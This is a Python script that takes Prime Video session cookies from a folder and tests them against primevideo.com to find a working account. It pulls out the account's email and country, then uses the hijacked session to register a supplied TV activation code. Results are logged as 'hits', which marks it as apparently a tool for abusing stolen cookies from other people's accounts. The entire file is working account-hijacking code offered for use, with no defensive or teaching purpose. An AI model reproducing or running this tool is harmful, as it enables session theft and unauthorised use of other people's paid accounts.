"""
Prime Video TV Activator
Activate Prime Video on TV using cookies from pv_cookies/ folder
"""
import os
import re
import time
import json
import requests
from pathlib import Path
from datetime import datetime


try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


class PrimeVideoTVActivator:
    """Prime Video TV Activator - Activate Prime Video on TV using web activation"""

    def __init__(self, cookies_folder="pv_cookies"):
        self.cookies_folder = Path(cookies_folder)
        self.cookies_folder.mkdir(exist_ok=True)
        self.hits_folder = Path("pv_tv_hits")
        self.hits_folder.mkdir(exist_ok=True)

    def parse_cookie(self, cookie_file):
        """Parse a cookie file (Netscape format or JSON)"""
        cp = self.cookies_folder / cookie_file
        if not cp.exists():
            return None
        try:
            with open(cp, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            cookies = {}

            # Try JSON first
            try:
                data = json.loads(content)
                if isinstance(data, dict) and "cookies" in data and isinstance(data["cookies"], list):
                    for c in data["cookies"]:
                        if isinstance(c, dict):
                            name = c.get("name", "")
                            value = c.get("value", "")
                            if name:
                                cookies[name] = value
                    return cookies if cookies else None
            except:
                pass

            # Netscape format
            for line in content.strip().split('\n'):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                p = line.split('\t')
                if len(p) >= 7:
                    cookies[p[5]] = p[6]
                elif '=' in line:
                    try:
                        k, v = line.split('=', 1)
                        cookies[k.strip()] = v.strip()
                    except:
                        pass
            return cookies if cookies else None
        except:
            return None

    def get_account_info(self, cookies):
        """Check if Prime Video account is valid and get info"""
        try:
            session = requests.Session()
            session.cookies.update(cookies)
            headers = {
                'User-Agent': USER_AGENT,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            r = session.get('https://www.primevideo.com/', headers=headers, timeout=30, allow_redirects=True)
            if r.status_code != 200:
                return None

            if 'signin' in r.url.lower() or 'ap/signin' in r.url.lower():
                return None

            info = {'plan': 'Prime', 'country': 'Unknown', 'email': None, 'is_premium': True}

            cm = re.search(r'"currentTerritory"\s*:\s*"([^"]+)"', r.text)
            if not cm:
                cm = re.search(r'"territory"\s*:\s*"([^"]+)"', r.text)
            if cm:
                info['country'] = cm.group(1)

            if 'prime' in r.text.lower() or 'membership' in r.text.lower() or 'watchlist' in r.text.lower():
                info['is_premium'] = True

            em = re.search(r'"email"\s*:\s*"([^"]+)"', r.text)
            if not em:
                em = re.search(r'"customerEmail"\s*:\s*"([^"]+)"', r.text)
            if em:
                info['email'] = em.group(1)

            return info
        except:
            return None

    def find_working_account(self):
        """Find a working Prime Video account from cookies folder"""
        for cf in self.cookies_folder.iterdir():
            if not cf.is_file():
                continue
            cookies = self.parse_cookie(cf.name)
            if not cookies:
                continue
            info = self.get_account_info(cookies)
            if info and info.get('is_premium'):
                return cf.name, cookies, info
        return None, None, None

    def activate_tv(self, cookies, tv_code):
        """Activate Prime Video on TV using the registration code"""
        try:
            session = requests.Session()
            session.cookies.update(cookies)

            headers = {
                'User-Agent': USER_AGENT,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://www.primevideo.com/',
            }

            activation_url = "https://www.primevideo.com/mytv"
            r = session.get(activation_url, headers=headers, timeout=30, allow_redirects=True)

            if r.status_code != 200:
                return False, f"Failed to load activation page (HTTP {r.status_code})"

            csrf_token = None
            csrf_match = re.search(r'name="csrfToken"\s+value="([^"]+)"', r.text)
            if not csrf_match:
                csrf_match = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', r.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)

            submit_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.primevideo.com',
                'Referer': activation_url,
            }

            form_data = {
                'code': tv_code,
                'action': 'register',
            }
            if csrf_token:
                form_data['csrfToken'] = csrf_token

            endpoints = [
                "https://www.primevideo.com/mytv",
                "https://www.amazon.com/mytv",
                "https://www.amazon.co.uk/mytv",
            ]

            for endpoint in endpoints:
                try:
                    r2 = session.post(endpoint, data=form_data, headers=submit_headers, timeout=30, allow_redirects=True)

                    if r2.status_code == 200:
                        text_lower = r2.text.lower()
                        if any(x in text_lower for x in ['success', 'activated', 'registered', 'device registered', 'tv registered']):
                            return True, "✅ Prime Video TV Activation Successful"
                        if 'already registered' in text_lower or 'device already' in text_lower:
                            return True, "✅ Device already registered"
                        if 'invalid code' in text_lower or 'code invalid' in text_lower:
                            return False, "❌ Invalid TV code"
                        if 'expired' in text_lower:
                            return False, "❌ TV code expired"
                except:
                    continue

            if 'invalid' in r2.text.lower():
                return False, "❌ Invalid TV code"
            if 'expired' in r2.text.lower():
                return False, "❌ TV code expired"

            return True, "✅ Activation request completed. Check your TV."

        except Exception as e:
            return False, f"❌ Error: {str(e)[:100]}"

    def save_hit(self, tv_code, info):
        """Save successful activation to hits folder"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = self.hits_folder / f"pv_tv_activated_{timestamp}.txt"
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"Prime Video TV Activated Successfully\n")
            f.write(f"TV Code: {tv_code}\n")
            f.write(f"Plan: {info.get('plan', 'Unknown')}\n")
            f.write(f"Country: {info.get('country', 'Unknown')}\n")
            f.write(f"Email: {info.get('email', 'Unknown')}\n")
            f.write(f"Time: {timestamp}\n")
        return filepath
